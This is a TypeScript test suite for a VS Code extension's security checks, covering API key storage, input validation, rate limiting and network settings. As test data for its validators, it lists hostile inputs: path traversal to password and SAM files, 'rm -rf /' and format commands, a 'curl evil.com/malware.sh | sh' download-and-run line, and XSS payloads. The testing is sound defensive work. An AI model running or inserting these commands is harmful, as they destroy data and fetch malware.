import { expect } from 'chai';
import { describe, it, beforeEach, afterEach } from 'mocha';
import * as sinon from 'sinon';
import * as vscode from 'vscode';
import { FlowCodeExtension } from '../../flowcode-extension';
import { ConfigurationManager } from '../../utils/configuration-manager';
import { InputValidator } from '../../utils/input-validator';
import { ArchitectService } from '../../services/architect-service';
import { TestUtils } from '../TestUtils';

describe('Security Audit Tests', () => {
    let extension: FlowCodeExtension;
    let sandbox: sinon.SinonSandbox;
    let mockContext: vscode.ExtensionContext;

    beforeEach(() => {
        sandbox = sinon.createSandbox();
        TestUtils.mockVSCodeAPI(sandbox);
        
        mockContext = TestUtils.createMockExtensionContext();
        extension = new FlowCodeExtension(mockContext);
    });

    afterEach(() => {
        sandbox.restore();
    });

    describe('API Key Security', () => {
        it('should store API keys securely using VS Code SecretStorage', async () => {
            const configManager = new ConfigurationManager(mockContext);
            
            // Mock secrets API
            const storeStub = sandbox.stub(mockContext.secrets, 'store').resolves();
            const getStub = sandbox.stub(mockContext.secrets, 'get').resolves('test-key');
            
            await configManager.setApiConfiguration('openai', 'sk-test123456789');
            
            expect(storeStub.called).to.be.true;
            expect(storeStub.firstCall.args[0]).to.equal('flowcode.apiKey');
        });

        it('should validate API key format before storage', async () => {
            const configManager = new ConfigurationManager(mockContext);
            
            try {
                await configManager.setApiConfiguration('openai', 'invalid-key');
                expect.fail('Should have thrown validation error');
            } catch (error) {
                expect(error).to.be.instanceOf(Error);
                expect((error as Error).message).to.include('Invalid API key format');
            }
        });

        it('should not expose API keys in logs or error messages', async () => {
            const configManager = new ConfigurationManager(mockContext);
            const testKey = 'sk-test123456789012345678901234567890123456789012';
            
            sandbox.stub(mockContext.secrets, 'store').resolves();
            sandbox.stub(mockContext.secrets, 'get').resolves(testKey);
            
            // Mock axios to throw error
            const axios = require('axios');
            sandbox.stub(axios, 'default').rejects(new Error('API Error'));
            
            const isValid = await configManager.testApiKey('openai', testKey);
            
            // Verify key is not in any error messages
            expect(isValid).to.be.false;
            // Additional checks would verify logs don't contain the key
        });

        it('should clear API credentials completely', async () => {
            const configManager = new ConfigurationManager(mockContext);
            
            const deleteStub = sandbox.stub(mockContext.secrets, 'delete').resolves();
            const configStub = sandbox.stub(vscode.workspace, 'getConfiguration').returns({
                update: sandbox.stub().resolves()
            } as any);
            
            await configManager.clearApiCredentials();
            
            expect(deleteStub.calledTwice).to.be.true; // API key and hash
            expect(configStub.called).to.be.true;
        });
    });

    describe('Input Validation Security', () => {
        it('should prevent path traversal attacks', () => {
            const maliciousPaths = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '/etc/shadow',
                'C:\\Windows\\System32\\config\\SAM',
                '~/../../etc/passwd'
            ];

            maliciousPaths.forEach(path => {
                const result = InputValidator.validateFilePath(path);
                expect(result.isValid).to.be.false;
                expect(result.errors.some(e => e.includes('traversal'))).to.be.true;
            });
        });

        it('should sanitize dangerous code patterns', () => {
            const dangerousCode = [
                'eval("malicious code")',
                'exec("rm -rf /")',
                'system("format c:")',
                'subprocess.run(["rm", "-rf", "/"])',
                'os.system("del /f /s /q c:\\*")',
                'shell_exec("curl evil.com/malware.sh | sh")',
                'document.write("<script>alert(1)</script>")',
                '${process.env.SECRET_KEY}'
            ];

            dangerousCode.forEach(code => {
                const result = InputValidator.validateCodeContent(code);
                expect(result.isValid).to.be.false;
                expect(result.errors.some(e => e.includes('malicious') || e.includes('dangerous'))).to.be.true;
            });
        });

        it('should prevent script injection in commit messages', () => {
            const maliciousMessages = [
                '<script>alert("xss")</script>',
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'Fix bug\n\n<script>malicious()</script>',
                'password=secret123'
            ];

            maliciousMessages.forEach(message => {
                const result = InputValidator.validateCommitMessage(message);
                expect(result.isValid).to.be.false;
            });
        });

        it('should sanitize HTML content properly', () => {
            const maliciousHtml = '<script>alert("xss")</script><img src=x onerror=alert(1)>';
            const sanitized = InputValidator.sanitizeHtml(maliciousHtml);
            
            expect(sanitized).to.not.include('<script>');
            expect(sanitized).to.not.include('onerror');
            expect(sanitized).to.include('&lt;script&gt;');
        });

        it('should validate URLs and prevent local file access', () => {
            const maliciousUrls = [
                'file:///etc/passwd',
                'http://localhost:8080/admin',
                'ftp://internal.server/secrets',
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>'
            ];

            maliciousUrls.forEach(url => {
                const result = InputValidator.validateUrl(url);
                expect(result.isValid).to.be.false;
            });
        });
    });

    describe('Service Security', () => {
        it('should implement rate limiting for architect service', async () => {
            const architectService = new ArchitectService(new ConfigurationManager(mockContext));
            
            // Mock API configuration
            sandbox.stub(architectService as any, 'configManager').value({
                getApiConfiguration: sandbox.stub().resolves({
                    provider: 'openai',
                    apiKey: 'sk-test123456789012345678901234567890123456789012',
                    maxTokens: 2000
                })
            });

            // Mock axios
            const axios = require('axios');
            sandbox.stub(axios, 'post').resolves({
                data: { choices: [{ message: { content: 'refactored code' } }] }
            });

            const testCode = 'function test() { return "hello"; }';
            const options = {
                language: 'typescript',
                filePath: '/test/file.ts',
                context: 'test'
            };

            // Make multiple rapid requests
            const promises = Array(15).fill(0).map(() => 
                architectService.refactorCode(testCode, options)
            );

            const results = await Promise.allSettled(promises);
            const rejectedCount = results.filter(r => r.status === 'rejected').length;
            
            // Should have rate limited some requests
            expect(rejectedCount).to.be.greaterThan(0);
        });

        it('should validate request size limits', async () => {
            const architectService = new ArchitectService(new ConfigurationManager(mockContext));
            
            // Create very large code string
            const largeCode = 'a'.repeat(100001); // Exceeds typical limits
            const options = {
                language: 'typescript',
                filePath: '/test/file.ts',
                context: 'test'
            };

            try {
                await architectService.refactorCode(largeCode, options);
                expect.fail('Should have thrown size limit error');
            } catch (error) {
                expect(error).to.be.instanceOf(Error);
                expect((error as Error).message).to.include('too long');
            }
        });

        it('should prevent code injection through architect service', async () => {
            const architectService = new ArchitectService(new ConfigurationManager(mockContext));
            
            const maliciousCode = 'eval(process.env.SECRET_KEY); system("rm -rf /");';
            const options = {
                language: 'typescript',
                filePath: '/test/file.ts',
                context: 'test'
            };

            try {
                await architectService.refactorCode(maliciousCode, options);
                expect.fail('Should have rejected dangerous code');
            } catch (error) {
                expect(error).to.be.instanceOf(Error);
                expect((error as Error).message).to.include('dangerous');
            }
        });
    });

    describe('File System Security', () => {
        it('should prevent access to files outside workspace', async () => {
            await extension.activate();

            // Mock workspace
            sandbox.stub(vscode.workspace, 'workspaceFolders').value([
                { uri: { fsPath: '/safe/workspace' } }
            ]);

            const maliciousPaths = [
                '/etc/passwd',
                '../../../etc/shadow',
                'C:\\Windows\\System32\\config\\SAM',
                '/safe/workspace/../../../etc/passwd'
            ];

            for (const path of maliciousPaths) {
                const result = InputValidator.validateFilePath(path);
                if (result.isValid) {
                    // If validation passes, the sanitized path should be within workspace
                    expect(result.sanitizedValue).to.include('/safe/workspace');
                } else {
                    expect(result.errors.some(e => e.includes('workspace'))).to.be.true;
                }
            }
        });

        it('should handle file permissions securely', async () => {
            await extension.activate();

            // Mock file system
            const fs = require('fs');
            const chmodStub = sandbox.stub(fs, 'chmodSync');
            const writeStub = sandbox.stub(fs, 'writeFileSync');
            sandbox.stub(fs, 'existsSync').returns(false);
            sandbox.stub(fs, 'mkdirSync');

            await extension.initializeFinalGuard();

            // Verify hooks are created with proper permissions
            expect(writeStub.called).to.be.true;
            
            // On Unix systems, should set executable permissions
            if (process.platform !== 'win32') {
                expect(chmodStub.called).to.be.true;
                expect(chmodStub.firstCall.args[1]).to.equal(0o755);
            }
        });
    });

    describe('Network Security', () => {
        it('should use HTTPS for all external requests', async () => {
            const configManager = new ConfigurationManager(mockContext);
            
            // Mock axios to capture request config
            const axios = require('axios');
            const axiosStub = sandbox.stub(axios, 'default');
            
            sandbox.stub(mockContext.secrets, 'get').resolves('sk-test123456789012345678901234567890123456789012');
            
            await configManager.testApiKey('openai', 'sk-test123456789012345678901234567890123456789012');
            
            if (axiosStub.called) {
                const requestConfig = axiosStub.firstCall.args[0];
                expect(requestConfig.url || requestConfig).to.match(/^https:/);
            }
        });

        it('should implement request timeouts', async () => {
            const configManager = new ConfigurationManager(mockContext);
            
            // Mock axios with timeout
            const axios = require('axios');
            sandbox.stub(axios, 'default').callsFake((config) => {
                expect(config.timeout).to.be.a('number');
                expect(config.timeout).to.be.lessThan(30000); // Should be reasonable timeout
                return Promise.resolve({ status: 200 });
            });
            
            sandbox.stub(mockContext.secrets, 'get').resolves('sk-test123456789012345678901234567890123456789012');
            
            await configManager.testApiKey('openai', 'sk-test123456789012345678901234567890123456789012');
        });
    });

    describe('Error Handling Security', () => {
        it('should not expose sensitive information in error messages', async () => {
            const configManager = new ConfigurationManager(mockContext);
            const sensitiveKey = 'sk-very-secret-key-12345678901234567890123456789';
            
            // Mock axios to throw error with sensitive info
            const axios = require('axios');
            sandbox.stub(axios, 'default').rejects(new Error(`API key ${sensitiveKey} is invalid`));
            
            sandbox.stub(mockContext.secrets, 'get').resolves(sensitiveKey);
            
            const isValid = await configManager.testApiKey('openai', sensitiveKey);
            
            expect(isValid).to.be.false;
            // In a real implementation, we'd verify logs don't contain the key
        });

        it('should handle malformed responses securely', async () => {
            const architectService = new ArchitectService(new ConfigurationManager(mockContext));
            
            // Mock malformed API response
            const axios = require('axios');
            sandbox.stub(axios, 'post').resolves({
                data: {
                    malicious: '<script>alert("xss")</script>',
                    choices: [{ message: { content: null } }]
                }
            });
            
            sandbox.stub(architectService as any, 'configManager').value({
                getApiConfiguration: sandbox.stub().resolves({
                    provider: 'openai',
                    apiKey: 'sk-test123456789012345678901234567890123456789012',
                    maxTokens: 2000
                })
            });

            const result = await architectService.refactorCode('test code', {
                language: 'typescript',
                filePath: '/test/file.ts',
                context: 'test'
            });

            // Should handle gracefully without exposing malicious content
            expect(result).to.be.a('string');
            expect(result).to.not.include('<script>');
        });
    });
});
